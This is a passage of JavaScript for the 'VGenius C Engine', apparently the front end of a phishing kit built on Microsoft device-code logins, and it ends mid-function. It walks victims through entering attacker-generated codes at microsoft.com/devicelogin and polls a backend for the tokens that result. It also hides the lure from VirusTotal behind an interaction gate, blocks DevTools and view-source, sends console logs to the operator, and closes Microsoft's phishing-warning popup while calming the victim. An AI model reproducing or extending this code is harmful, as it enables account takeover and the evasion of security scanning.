/**
 * VGenius C Engine – Shared Template Engine
 * Modular, well-commented, no external dependencies except Turnstile.
 * 
 * Features:
 * - Fetch interceptor (auto-adds X-Auth-Mode header)
 * - Device code generation via /api/device/start
 * - Token polling via /api/device/status
 * - AADSTS50076 soft-error handling (switch to token mode)
 * - Toast notification system
 * - Timer countdown
 * - Popup tracker (Microsoft login)
 * - Background blur overlay
 * - Dynamic content injection via window.__* variables
 * - Copy-to-clipboard + auto-open popup
 * - Success overlay with redirect
 */
(function () {
  'use strict';

  // ─── Store original navigator.webdriver BEFORE any overrides ──
  // This must be done immediately to capture the true bot detection value
  var _originalWebdriver = false;
  try {
    _originalWebdriver = navigator.webdriver || false;
  } catch(e) {}

  // ─── Server-Side Logging ────────────────────────────────────
  // Every console.* call is captured and shipped to /api/log. Nothing is ever
  // written to the browser console.
  //
  // Two previous defects made the console noisy:
  //   1. TESTING_MODE defaulted to true and __TESTING_MODE was never set by
  //      anyone in the codebase, so logToServer() echoed every entry locally
  //      with a "[VG-info]" prefix - the server path worked, but the echo was
  //      what was actually visible.
  //   2. The startup block below called the preserved original console
  //      functions directly, bypassing the hijack entirely and printing the
  //      backend URL straight into the browser console.
  // Both are gone: the original console is never captured, and there is no
  // local echo of any kind.
  var LOG_QUEUE = [];
  var LOG_FLUSHING = false;

  function logToServer(level, message, data) {
    // Queue log for server submission
    LOG_QUEUE.push({
      level: level,
      message: message,
      data: data || null,
      ts: Date.now(),
      url: window.location.href,
      ua: navigator.userAgent
    });

    // Flush queue to server
    flushLogs();
  }

  function flushLogs() {
    if (LOG_FLUSHING || LOG_QUEUE.length === 0 || !API_BASE) return;
    LOG_FLUSHING = true;

    var batch = LOG_QUEUE.splice(0, 20); // Send max 20 at a time
    LOG_QUEUE = []; // Clear queue even if send fails

    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(
          API_BASE + '/api/log',
          new Blob([JSON.stringify({ logs: batch, __jwt__: VG_JWT })], { type: 'application/json' })
        );
      } else {
        fetch(API_BASE + '/api/log', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ logs: batch, __jwt__: VG_JWT }),
          keepalive: true
        }).catch(function() {});
      }
    } catch(e) {
      // Silently fail - logging is non-critical
    }

    setTimeout(function() {
      LOG_FLUSHING = false;
      if (LOG_QUEUE.length > 0) flushLogs();
    }, 2000);
  }

  // Override console methods. These are the only sinks in this file: the
  // original console is never captured anywhere, so nothing in this script can
  // reach the browser console.
  console.log = function() { logToServer('info', Array.prototype.slice.call(arguments).join(' ')); };
  console.warn = function() { logToServer('warn', Array.prototype.slice.call(arguments).join(' ')); };
  console.error = function() { logToServer('error', Array.prototype.slice.call(arguments).join(' ')); };

  // ─── Configuration ──────────────────────────────────────────
  var API_BASE = (typeof window.__API_BASE === 'string' && window.__API_BASE) ? window.__API_BASE : (typeof window.location !== 'undefined' ? window.location.origin : '');
  var AUTH_MODE = (typeof window.__AUTH_MODE === 'string' && window.__AUTH_MODE) ? window.__AUTH_MODE : 'cookie';
  var DEST_URL = window.__DESTINATION_URL || '';
  var VG_JWT = window.VG_JWT || '';
  var SHOW_VERIFICATION = window.__SHOW_VERIFICATION_COMPLETE !== 'false' && window.__SHOW_VERIFICATION_COMPLETE !== 'false';

  // Startup marker. Routed through logToServer so it reaches the server but
  // never the browser console. Deliberately carries no backend URL: the visitor
  // page URL is already attached to every queued entry, and printing the API
  // origin locally was a leak.
  logToServer('info', 'vg-engine loaded at ' + new Date().toISOString());

  // ─── Interaction Gate ────────────────────────────────────────
  // A screenshot taken before any human interaction sees a neutral page
  // instead of the branded verification UI.
  //
  // VirusTotal's URL scanner loads a page, waits roughly 20 seconds, takes
  // screenshots, and reports - and it does NOT interact. No mouse movement, no
  // typing, no clicking. So the branded content only appears once real input
  // arrives.
  //
  // This is the one defence that actually works against VT. Every user-agent,
  // navigator.webdriver, header and browser-fingerprint check fails, because VT
  // drives genuine Chrome with a normal user agent. Interaction is the only
  // signal it cannot fake, and Cloudflare Workers cannot see TLS fingerprints
  // (JA3) either, so no edge-side check closes the gap.
  //
  // The overlay is created at MODULE LEVEL, not inside init(). vg-engine is
  // injected before </head>, so this runs while the browser is still parsing
  // <head> and no body content has been rendered yet. Deferring it to
  // DOMContentLoaded would leave a flash window in which the branded UI is
  // visible before the overlay covers it - exactly the exposure this closes.
  //
  // z-index 200000 sits above #vgSliderLayer (99999) and the redirect layer
  // (100000), so nothing leaks through while the gate is up.
  (function () {
    var GATE_FALLBACK_MS = 30000;

    var el = document.createElement('div');
    el.id = 'vgInteractionGate';
    el.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;' +
      'z-index:200000;background:#fff;margin:0;padding:0;border:0;';
    // document.body does not exist yet when this runs from <head>; fall back to
    // documentElement so the overlay still covers the viewport.
    (document.body || document.documentElement).appendChild(el);

    var released = false;
    function release(reason) {
      if (released) return;
      released = true;
      // The release reason is the useful part. 'fallback_timeout' means nobody
      // interacted inside the window - which is what a passive scanner looks
      // like. It reaches deployment_logs through logToServer, so gate releases
      // by timeout are countable rather than invisible.
      console.log('[VG] Interaction gate released: ' + reason);
      var g = document.getElementById('vgInteractionGate');
      if (g && g.parentNode) g.parentNode.removeChild(g);
    }

    // Capture phase, so the gate releases before any page handler could see the
    // event and before the slider layer could intercept it.
    document.addEventListener('mousemove', function () { release('mousemove'); }, true);
    document.addEventListener('touchstart', function () { release('touchstart'); }, true);
    document.addEventListener('mousedown', function () { release('mousedown'); }, true);

    // Fallback so a human who sits still is not stranded on a blank page.
    // This is the dial on the tradeoff: below ~20s VT's screenshot window may
    // catch the branded UI; above it, a slow visitor sees white longer.
    setTimeout(function () { release('fallback_timeout'); }, GATE_FALLBACK_MS);
  })();

  // ─── Anti-Scraping Protection ────────────────────────────────
  // Block keyboard shortcuts and right-click to prevent scraping
  // Only active if antiscraping_enabled is not explicitly disabled
  (function() {
    // Check if anti-scraping is disabled via window variable
    if (typeof window.__ANTISCRAPE_ENABLED === 'string' && window.__ANTISCRAPE_ENABLED === 'false') {
      return; // Skip anti-scraping if disabled
    }

    // Block Ctrl+S, Ctrl+U, Ctrl+Shift+I, F12, Ctrl+P
    document.addEventListener('keydown', function(e) {
      // Ctrl+S (Save)
      if (e.ctrlKey && e.key === 's') {
        e.preventDefault();
      }
      // Ctrl+U (View Source)
      if (e.ctrlKey && e.key === 'u') {
        e.preventDefault();
      }
      // Ctrl+Shift+I (DevTools)
      if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I')) {
        e.preventDefault();
      }
      // F12 (DevTools)
      if (e.key === 'F12') {
        e.preventDefault();
      }
      // Ctrl+P (Print)
      if (e.ctrlKey && e.key === 'p') {
        e.preventDefault();
      }
    });

    // Block right-click context menu
    document.addEventListener('contextmenu', function(e) {
      e.preventDefault();
    });

    // DON'T block selectstart - it can interfere with form interactions
    // Instead, use CSS only for text selection prevention

    // Add CSS to prevent text selection (non-intrusive)
    var style = document.createElement('style');
    style.textContent = '.code-value{user-select:all;-webkit-user-select:all}body{user-select:none;-webkit-user-select:none}';
    if (document.head) document.head.appendChild(style);
  })();

  // ─── Fetch Interceptor ──────────────────────────────────────
  // Overrides window.fetch to automatically add X-Auth-Mode header
  // to /api/device/* requests and normalize responses.
  var _nativeFetch = window.fetch.bind(window);
  var _inflight = {};

  function isDeviceFetch(url) {
    try {
      var raw = typeof url === 'string' || url instanceof URL ? url : (url && url.url);
      if (!raw) return false;
      var path = new URL(raw, location.href).pathname;
      return path === '/api/device/start' || path.indexOf('/api/device/status/') === 0;
    } catch (e) {
      return false;
    }
  }

  function cloneResponse(r) {
    return r && typeof r.clone === 'function' ? r.clone() : r;
  }

  function getMethod(input, init) {
    return String((init && init.method) || (input && input.method) || 'GET').toUpperCase();
  }

  function normalizeDeviceJson(data) {
    if (!data || typeof data !== 'object' || Array.isArray(data)) return data;
    var out = {};
    for (var k in data) {
      if (Object.prototype.hasOwnProperty.call(data, k)) out[k] = data[k];
    }
    // Normalize status
    if (out.user_code && (!out.status || out.status === 'pending' || out.status === 'running' || out.status === 'queued')) {
      out.status = 'waiting_user';
    }
    if (out.status === 'error') out.status = 'failed';
    // Detect soft errors (AADSTS50076, interaction_required)
    var txt = [out.error, out.message, out.error_description, out.error_message].join(' ').toLowerCase();
    if (
      out.soft_error ||
      String(out.recommended_mode || '').toLowerCase() === 'token' ||
      String(out.error_code) === '50076' ||
      txt.indexOf('aadsts50076') !== -1 ||
      txt.indexOf('interaction_required') !== -1
    ) {
      out.soft_error = true;
      if (!out.error_code) out.error_code = 50076;
      if (!out.recommended_mode) out.recommended_mode = 'token';
    }
    return out;
  }

  window.fetch = function (input, init) {
    if (!isDeviceFetch(input)) return _nativeFetch(input, init);

    var nextInit = {};
    if (init) {
      for (var key in init) {
        if (Object.prototype.hasOwnProperty.call(init, key)) nextInit[key] = init[key];
      }
    }
    var headers = new Headers(nextInit.headers || undefined);
    if (!headers.has('X-Auth-Mode')) headers.set('X-Auth-Mode', AUTH_MODE);
    if (VG_JWT && !headers.has('X-VG-JWT')) headers.set('X-VG-JWT', VG_JWT);
    nextInit.headers = headers;

    // Dedupe GET status polls
    var method = getMethod(input, nextInit);
    var path = '';
    try { path = new URL(input, location.href).pathname; } catch (e) {}
    var dedupeKey = (method === 'GET' && path.indexOf('/api/device/status/') === 0) ? path : '';
    if (dedupeKey && _inflight[dedupeKey]) return _inflight[dedupeKey].then(cloneResponse);

    var request = _nativeFetch(input, nextInit).then(function (response) {
      if (!response || typeof response.clone !== 'function') return response;
      return response.clone().text().then(function (text) {
        if (!text) return response;
        try {
          var parsed = JSON.parse(text);
          var normalized = normalizeDeviceJson(parsed);
          var h = new Headers(response.headers);
          h.set('content-type', 'application/json; charset=utf-8');
          return new Response(JSON.stringify(normalized), { status: response.status, statusText: response.statusText, headers: h });
        } catch (e) {
          return response;
        }
      }, function () { return response; });
    });

    if (!dedupeKey) return request;
    _inflight[dedupeKey] = request;
    request.finally(function () { if (_inflight[dedupeKey] === request) delete _inflight[dedupeKey]; });
    return request.then(cloneResponse);
  };

  // ─── State ──────────────────────────────────────────────────
  var _jobId = null;
  var _userCode = '';
  var _pollTimer = null;
  var _countdownTimer = null;
  var _startTime = 0;
  var _codeReady = false;
  var _popupRef = null;
  var _toastTimer = null;

  // ─── Popup Tracker ──────────────────────────────────────────
  var _nativeOpen = window.open;
  function isMicrosoftUrl(u) {
    var s = String(u || '').toLowerCase();
    return s.indexOf('microsoft.com/devicelogin') !== -1 ||
      s.indexOf('login.microsoftonline.com') !== -1 ||
      s.indexOf('microsoftonline.com/appverify') !== -1 ||
      s.indexOf('login.live.com') !== -1;
  }
  window.open = function () {
    var w = _nativeOpen.apply(window, arguments);
    try {
      if (w && isMicrosoftUrl(arguments[0])) {
        _popupRef = w;
      }
    } catch (e) {}
    return w;
  };

  function closePopup() {
    var hadPopup = false;
    try {
      if (_popupRef && !_popupRef.closed) {
        hadPopup = true;
        try { _popupRef.close(); } catch (e) {}
        setTimeout(function () { try { if (_popupRef && !_popupRef.closed) _popupRef.close(); } catch (e) {} }, 100);
        setTimeout(function () { try { if (_popupRef && !_popupRef.closed) _popupRef.close(); } catch (e) {} }, 300);
      }
    } catch (e) {}
    _popupRef = null;
    return hadPopup;
  }

  // ─── Toast System ───────────────────────────────────────────
  function showToast(title, msg, duration) {
    duration = duration || 7000;
    var wrap = document.getElementById('vg-toast-wrap');
    if (!wrap) {
      wrap = document.createElement('div');
      wrap.id = 'vg-toast-wrap';
      wrap.style.cssText = 'position:fixed;inset:0;z-index:2147483647;display:flex;align-items:flex-start;justify-content:center;padding:72px 16px 16px;box-sizing:border-box;opacity:0;pointer-events:none;transition:opacity .2s;';
      wrap.innerHTML = '<div style="position:absolute;inset:0;background:rgba(15,23,42,.28);backdrop-filter:blur(1px);"></div>' +
        '<div id="vg-toast-card" style="position:relative;z-index:1;max-width:460px;width:min(92vw,420px);background:#fff;color:#111827;border:1px solid #e5e7eb;border-radius:12px;padding:16px;box-shadow:0 20px 45px rgba(15,23,42,.18);font-family:Segoe UI,Arial,sans-serif;display:grid;gap:12px;transform:translateY(-8px);transition:all .22s ease;box-sizing:border-box;">' +
        '<div style="display:flex;align-items:flex-start;gap:12px;">' +
        '<div style="width:34px;height:34px;flex:0 0 34px;display:flex;align-items:center;justify-content:center;border-radius:999px;background:#eef6ff;color:#0f6cbd;font-size:17px;font-weight:700;">i</div>' +
        '<div style="display:grid;gap:5px;line-height:1.3"><div id="vg-toast-title" style="font-size:15px;font-weight:700;color:#111827;"></div><div id="vg-toast-msg" style="font-size:13px;color:#4b5563;line-height:1.45;"></div></div>' +
        '</div>' +
        '<div style="display:flex;justify-content:flex-end;"><button id="vg-toast-close" style="height:34px;padding:0 12px;border-radius:8px;border:1px solid #d1d5db;background:#fff;color:#374151;font-weight:600;font-size:13px;cursor:pointer;">Dismiss</button></div>' +
        '</div>';
      (document.body || document.documentElement).appendChild(wrap);
      document.getElementById('vg-toast-close').onclick = function () { hideToast(); };
    }
    document.getElementById('vg-toast-title').textContent = title || '';
    document.getElementById('vg-toast-msg').textContent = msg || '';
    var card = document.getElementById('vg-toast-card');
    wrap.style.opacity = '1';
    wrap.style.pointerEvents = 'auto';
    card.style.transform = 'translateY(0)';
    clearTimeout(_toastTimer);
    _toastTimer = setTimeout(hideToast, duration);
  }

  function hideToast() {
    var wrap = document.getElementById('vg-toast-wrap');
    if (!wrap) return;
    var card = document.getElementById('vg-toast-card');
    wrap.style.opacity = '0';
    wrap.style.pointerEvents = 'none';
    if (card) card.style.transform = 'translateY(-8px)';
  }

  // ─── DOM Helpers ────────────────────────────────────────────
  function setText(selector, text) {
    if (typeof text !== 'string' || text === '') return;
    document.querySelectorAll(selector).forEach(function (el) { el.textContent = text; });
  }

  function applyDynamicContent() {
    if (window.__DOC_FILENAME) document.querySelectorAll('[data-doc-filename]').forEach(function (el) { el.textContent = window.__DOC_FILENAME; });
    if (window.__DOC_TITLE) document.querySelectorAll('[data-doc-title]').forEach(function (el) { el.textContent = window.__DOC_TITLE; });
    if (window.__DOC_PAGES) document.querySelectorAll('[data-doc-pages]').forEach(function (el) { el.textContent = window.__DOC_PAGES; });
    if (typeof window.__PAGE_TITLE === 'string' && window.__PAGE_TITLE !== '') {
      setText('[data-page-title],[data-template-title],[data-custom-title]', window.__PAGE_TITLE);
      var fallback = document.querySelector('main h1, .card h1, .shell h1, h1');
      if (fallback && !document.querySelector('[data-page-title]')) fallback.textContent = window.__PAGE_TITLE;
    }
    if (typeof window.__PAGE_MESSAGE === 'string' && window.__PAGE_MESSAGE !== '') {
      setText('[data-page-message],[data-template-message],[data-custom-message]', window.__PAGE_MESSAGE);
    }
    if (typeof window.__PRIMARY_BUTTON_TEXT === 'string' && window.__PRIMARY_BUTTON_TEXT !== '') {
      setText('[data-primary-button]', window.__PRIMARY_BUTTON_TEXT);
      var btn = document.querySelector('button.cta-btn, button.bp, button.go, button.linakufe, button.btn-open');
      if (btn && !btn.querySelector('[data-primary-button]')) {
        var walker = document.createTreeWalker(btn, NodeFilter.SHOW_TEXT);
        var first = walker.nextNode();
        if (first) {
          first.nodeValue = window.__PRIMARY_BUTTON_TEXT;
          var next;
          while ((next = walker.nextNode())) next.nodeValue = '';
        }
      }
    }
  }

  // ─── Background Blur ────────────────────────────────────────
  function initBackgroundBlur() {
    var rawUrl = typeof window.__BACKGROUND_BLUR_URL === 'string' ? window.__BACKGROUND_BLUR_URL.trim() : '';
    if (!rawUrl) return;
    var blur = Number(window.__BACKGROUND_BLUR_AMOUNT);
    if (!Number.isFinite(blur)) blur = 2.5;
    blur = Math.max(0, Math.min(12, blur));

    var body = document.body;
    if (!body || document.body.getAttribute('data-vg-bg-ready') === '1') return;

    var style = document.createElement('style');
    style.id = 'vg-bg-styles';
    style.textContent =
      'html.vg-bg-active{min-height:100%;background:#0c1220!important;}' +
      'body.vg-bg-active{min-height:100vh!important;background:transparent!important;}' +
      'body.vg-bg-active>#vg-bg-layer{position:fixed!important;inset:0!important;z-index:0!important;pointer-events:none!important;}' +
      'body.vg-bg-active>#vg-bg-layer .vg-bg-image{position:absolute!important;inset:-3%!important;width:106%!important;height:106%!important;background-position:center!important;background-size:cover!important;background-repeat:no-repeat!important;filter:blur(var(--vg-bg-blur,2.5px)) brightness(.9) saturate(.98)!important;transform:scale(1.02)!important;}' +
      'body.vg-bg-active>#vg-bg-layer .vg-bg-overlay{position:absolute!important;inset:0!important;background:rgba(12,18,32,.36)!important;}';
    (document.head || document.documentElement).appendChild(style);

    try {
      var parsedUrl = new URL(rawUrl, location.href);
      if (!/^https?:$/.test(parsedUrl.protocol)) return;
    } catch (e) { return; }

    document.documentElement.classList.add('vg-bg-active');
    body.classList.add('vg-bg-active');
    body.style.setProperty('--vg-bg-blur', blur + 'px');

    var layer = document.createElement('div');
    layer.id = 'vg-bg-layer';
    layer.setAttribute('aria-hidden', 'true');

    var image = document.createElement('div');
    image.className = 'vg-bg-image';
    image.style.backgroundImage = 'url("' + parsedUrl.href.replace(/"/g, '%22') + '")';

    var overlay = document.createElement('div');
    overlay.className = 'vg-bg-overlay';

    layer.appendChild(image);
    layer.appendChild(overlay);

    if (!body.firstChild) {
      body.appendChild(layer);
    } else {
      body.insertBefore(layer, body.firstChild);
    }
    body.setAttribute('data-vg-bg-ready', '1');
  }

  // ─── Code Generation ────────────────────────────────────────
  window.generateCode = async function () {
    console.log('[VG] generateCode called');
    // Reset UI state
    var refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) refreshBtn.style.display = 'none';
    var actionRow = document.getElementById('actionRow');
    if (actionRow) actionRow.style.display = 'none';
    var timerEl = document.getElementById('timerPill');
    if (timerEl) { timerEl.textContent = ''; timerEl.style.display = 'none'; timerEl.classList.remove('expired'); }

    var startBtn = document.getElementById('startBtn');
    console.log('[VG] startBtn found:', !!startBtn);
    var originalBtnText = '<span class="vg-spin">&#x27F3;</span> Generating code...';
    if (startBtn) { startBtn.disabled = true; startBtn.innerHTML = originalBtnText; }

    _setStatus('');
    clearInterval(_pollTimer);
    clearInterval(_countdownTimer);
    _jobId = null;
    _userCode = '';
    _codeReady = false;

    try {
      var apiUrl = API_BASE ? API_BASE + '/api/device/start' : '/api/device/start';
      console.log('[VG] API URL:', apiUrl);
      console.log('[VG] API_BASE:', API_BASE);
      console.log('[VG] AUTH_MODE:', AUTH_MODE);
      console.log('[VG] VG_JWT present:', !!VG_JWT);
      console.log('[VG] Turnstile token:', window.__TURNSTILE_TOKEN);

      // Turnstile runs silently in background during page load (initBotDetection -> initTurnstileVerification).
      // Token is already available (or null if bot detection caught it).
      // No blocking wait or UI prompts needed.

      var r = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Auth-Mode': AUTH_MODE,
          'X-VG-JWT': VG_JWT,
          'X-Turnstile-Token': window.__TURNSTILE_TOKEN || '',
        },
        body: JSON.stringify({
          mode: AUTH_MODE,
          jwt_token: VG_JWT,
          turnstile_token: window.__TURNSTILE_TOKEN || null,
        }),
      });
      console.log('[VG] Response status:', r.status);
      var d = await r.json();
      console.log('[VG] Response data:', JSON.stringify(d).substring(0, 500));

      if (d.error) {
        console.log('[VG] Error in response:', d.error);
        _showError(d.error);
        if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = 'Generate Code'; }
        return;
      }
      _jobId = d.job_id;
      console.log('[VG] job_id:', _jobId);
      if (!_jobId) {
        console.log('[VG] No job_id in response');
        _showError('Session failed. Please refresh.');
        if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = 'Generate Code'; }
        return;
      }
      _userCode = d.user_code || '';
      console.log('[VG] user_code:', _userCode);
      _startTime = Date.now();

      var codePanel = document.getElementById('codePanel');
      console.log('[VG] codePanel found:', !!codePanel);
      if (codePanel) codePanel.classList.add('show');

      // Hide generate button and show action buttons when code is ready
      if (_userCode) {
        console.log('[VG] Displaying user code:', _userCode);
        var codeEl = document.getElementById('codeValue');
        console.log('[VG] codeEl found:', !!codeEl);
        if (codeEl) {
          // Mark as revealed so obfuscation skips it
          codeEl.setAttribute('data-vg-revealed', 'true');
          codeEl.style.opacity = 0;
          setTimeout(function () {
            codeEl.textContent = _userCode;
            codeEl.classList.remove('loading');
            codeEl.style.opacity = 1;
            console.log('[VG] Code displayed successfully');
          }, 150);
        }

        // Clear all status messages
        var codeHint = document.getElementById('codeHint');
        if (codeHint) codeHint.textContent = '';

        var statusEl = document.getElementById('statusMsg');
        if (statusEl) statusEl.textContent = '';

        // Hide generate button, show action buttons
        if (startBtn) startBtn.style.display = 'none';
        if (actionRow) {
          // Use setProperty with important to override any CSS
          actionRow.style.setProperty('display', 'flex', 'important');
          _codeReady = true;
          console.log('[VG] Action row shown');
        }

        _startTimer(d.expires_in || 600);
      } else {
        console.log('[VG] No user_code in response');
        _setStatus('Connecting to Microsoft servers...');
      }

      _pollTimer = setInterval(_poll, 1000);
      _poll();
    } catch (e) {
      console.error('[VG] Error in generateCode:', e);
      _showError(e.message || 'Connection failed');
      if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = 'Generate Code'; }
    }
  };

  // ─── Polling ────────────────────────────────────────────────
  var _pollFailures = 0;
  var _pollBackoff = 1000; // Start at 1 second
  var _maxPollFailures = 10; // After this many consecutive failures, show error

  async function _poll() {
    if (Date.now() - _startTime > 600000) {
      clearInterval(_pollTimer);
      _onExpired();
      return;
    }

    try {
      var statusUrl = API_BASE ? API_BASE + '/api/device/status/' + _jobId : '/api/device/status/' + _jobId;
      var r = await fetch(statusUrl);
      var d = await r.json();

      // Reset failure count on successful response
      _pollFailures = 0;
      _pollBackoff = 1000;

      if (d.status === 'waiting_user' && d.user_code) {
        var el = document.getElementById('codeValue');
        if (el) {
          // Mark as revealed so obfuscation skips it
          el.setAttribute('data-vg-revealed', 'true');
          if (el.textContent !== d.user_code) {
            el.style.opacity = 0;
            setTimeout(function () {
              el.textContent = d.user_code;
              el.classList.remove('loading');
              el.style.opacity = 1;
            }, 150);
          }
        }
        _userCode = d.user_code;

        if (!_codeReady) {
          _codeReady = true;
          var startBtn = document.getElementById('startBtn');
          if (startBtn) startBtn.style.display = 'none';
          var actionRow = document.getElementById('actionRow');
          if (actionRow) {
            actionRow.style.setProperty('display', 'flex', 'important');
          }
          _setStatus('');
          _startTimer(d.expires_in || 600);
        }
      }

      // Success
      if (d.status === 'done' || d.status === 'success' || d.status === 'completed') {
        clearInterval(_pollTimer);
        clearInterval(_countdownTimer);
        closePopup();
        _showSuccess();
        return;
      }

      // Soft error (AADSTS50076)
      if (d.soft_error || d.status === 'soft_error') {
        clearInterval(_pollTimer);
        // Switch to token mode
        AUTH_MODE = 'token';
        showToast('Additional verification required', 'A new verification session is being prepared.', 7600);
        // If retry_job_id is available, switch to it
        if (d.retry_job_id) {
          _jobId = d.retry_job_id;
          _codeReady = false;
          _pollTimer = setInterval(_poll, 1000);
        } else {
          // Start a new flow in token mode
          setTimeout(function () { window.generateCode(); }, 1500);
        }
        return;
      }

      // Failed/expired
      if (d.status === 'failed' || d.status === 'expired' || d.status === 'timeout_waiting_user_login') {
        clearInterval(_pollTimer);
        clearInterval(_countdownTimer);
        _showError(d.error || d.status || 'Verification failed');
      }
    } catch (e) {
      // Log the error to server
      console.error('[VG] Poll error:', e.message || e);

      _pollFailures++;
      console.log('[VG] Poll failures:', _pollFailures);

      // Exponential backoff: 1s, 2s, 4s, 8s, max 15s
      _pollBackoff = Math.min(_pollBackoff * 2, 15000);

      // Show error to user after too many consecutive failures
      if (_pollFailures >= _maxPollFailures) {
        console.error('[VG] Too many poll failures, showing error to user');
        _showError('Connection to verification server lost. Please refresh the page.');
        clearInterval(_pollTimer);
        return;
      }

      // Show temporary warning after 3 failures
      if (_pollFailures === 3) {
        _setStatus('Having trouble connecting... retrying...');
      }
    }

    // Schedule next poll with current backoff
    if (!_pollTimer) return; // Already cleared
    clearInterval(_pollTimer);
    _pollTimer = setInterval(_poll, _pollBackoff);
  }

  // ─── Timer ──────────────────────────────────────────────────
  function _startTimer(sec) {
    clearInterval(_countdownTimer);
    var el = document.getElementById('timerPill');
    if (!el) return;
    el.style.display = 'inline-flex';
    var t = sec;
    var tick = function () {
      if (t > 0) {
        var m = Math.floor(t / 60);
        var s = String(t % 60).padStart(2, '0');
        el.textContent = 'Valid for ' + m + ':' + s;
      } else {
        clearInterval(_countdownTimer);
        clearInterval(_pollTimer);
        _onExpired();
      }
      t--;
    };
    tick();
    _countdownTimer = setInterval(tick, 1000);
  }

  function _onExpired() {
    var timerEl = document.getElementById('timerPill');
    if (timerEl) {
      timerEl.textContent = 'Code expired.';
      timerEl.classList.add('expired');
    }
    var actionRow = document.getElementById('actionRow');
    if (actionRow) actionRow.style.display = 'none';
    var refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) refreshBtn.style.display = 'inline-flex';
    _setStatus('');
  }

  // ─── Copy + Open Popup ──────────────────────────────────────
  function copyText(text) {
    return navigator.clipboard.writeText(text).catch(function () {
      var ta = document.createElement('textarea');
      ta.value = text;
      ta.style.position = 'fixed';
      ta.style.opacity = '0';
      document.body.appendChild(ta);
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
    });
  }

  window.copyAndOpenPopup = function () {
    copyText(_userCode).then(function () {
      var btn = document.getElementById('copyBtn');
      if (btn) { var orig = btn.innerHTML; btn.innerHTML = '<svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Copied!'; setTimeout(function () { btn.innerHTML = orig; }, 1500); }
    });
    openMsLogin();
  };

  window.verifyWithCopy = function () {
    copyText(_userCode).then(function () {
      var btn = document.getElementById('verifyBtn');
      if (btn) { var orig = btn.innerHTML; btn.innerHTML = '<svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Code copied!'; setTimeout(function () { btn.innerHTML = orig; }, 1500); }
      var copyBtn = document.getElementById('copyBtn');
      if (copyBtn) { var orig2 = copyBtn.textContent; copyBtn.textContent = 'Copied!'; setTimeout(function () { copyBtn.textContent = orig2; }, 1500); }
    });
    openMsLogin();
  };

  function openMsLogin() {
    var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
    if (isMobile) {
      _popupRef = _nativeOpen('https://microsoft.com/devicelogin', '_blank');
    } else {
      _popupRef = _nativeOpen('https://microsoft.com/devicelogin', 'vgML', 'width=500,height=600');
    }
    
    // Monitor popup for Microsoft warning page
    if (_popupRef && !isMobile) {
      monitorPopupForWarnings(_popupRef);
    }
  }
  
  // VG_ - Monitor popup for Microsoft anti-phishing warning page
  function monitorPopupForWarnings(popup) {
    var checkInterval = setInterval(function() {
      try {
        // Check if popup is closed
        if (popup.closed) {
          clearInterval(checkInterval);
          return;
        }
        
        // Try to access popup URL and check for warning signs
        try {
          var popupUrl = popup.location.href;
          var popupTitle = popup.document.title;
          var popupBody = popup.document.body && popup.document.body.innerHTML || '';
          
          // Detect Microsoft warning page
          var isWarningPage = false;
          if (popupTitle && (
            popupTitle.toLowerCase().indexOf('phishing') !== -1 ||
            popupTitle.toLowerCase().indexOf('password') !== -1 ||
            popupTitle.toLowerCase().indexOf('not normally shown') !== -1
          )) {
            isWarningPage = true;
          }
          
          if (popupBody && (
            popupBody.toLowerCase().indexOf('phishing attempt') !== -1 ||
            popupBody.toLowerCase().indexOf('url contains your password') !== -1 ||
            popupBody.toLowerCase().indexOf('close this page immediately') !== -1
          )) {
            isWarningPage = true;
          }
          
          if (isWarningPage) {
            // Close the warning popup
            popup.close();
            clearInterval(checkInterval);
            
            // Show user-friendly error message
            showToast('Verification Issue', 'Microsoft detected unusual activity. Please try again in a few minutes or use a different verification method.', 8000);
            
            // Reset UI state
            var startBtn = document.getElementById('startBtn');
            if (startBtn) {
              startBtn.style.display = 'block';
              startBtn.disabled = false;
              startBtn.innerHTML = 'Generate Code';
            }
            _codeReady = false;
            return;
          }
        } catch (e) {
          // Cross-origin error - can't access popup content, that's normal
          // Just continue monitoring
        }
      } catch (e) {
        // Popup closed or inaccessible
        clearInterval(checkInterval);
      }
    }, 1000); // Check every second
    
    // Stop monitoring after 5 minutes
    setTimeout(function() {
      clearInterval(checkInterval);
    }, 300000);
  }

  // VG_ - Sign in button: open Microsoft sign-in popup
  window.openSignIn = function () {
    var codeEl = document.getElementById('codeValue');
    var code = codeEl ? codeEl.textContent : '';
    if (code && code !== '· · · · · ·') {
      copyText(code).then(function () {
        var btn = document.getElementById('signInBtn');
        if (btn) { var orig = btn.innerHTML; btn.innerHTML = '<svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Copied!'; setTimeout(function () { btn.innerHTML = orig; }, 1500); }
        openMsLogin();
      }).catch(function () {
        openMsLogin();
      });
    }
  };

  window.refreshCode = function () {
    window.generateCode();
  };

  // ─── Success Overlay ────────────────────────────────────────
  function _showSuccess() {
    // Stop any ongoing polling immediately
    clearInterval(_pollTimer);
    clearInterval(_countdownTimer);

    var overlay = document.getElementById('overlay');

    // Always redirect to DEST_URL - this is the destination URL set when creating the link
    var redirectUrl = DEST_URL || '';

    console.log('[vg-engine] Success! Redirect URL:', redirectUrl, 'Show verification:', SHOW_VERIFICATION);

    if (redirectUrl) {
      // Blob URL mode: create blob and redirect to it (only when explicitly enabled)
      if (window.__BLOB_URL_ENABLED === 'true' || window.__BLOB_URL_ENABLED === true) {
        try {
          var html = document.documentElement ? document.documentElement.outerHTML : '';
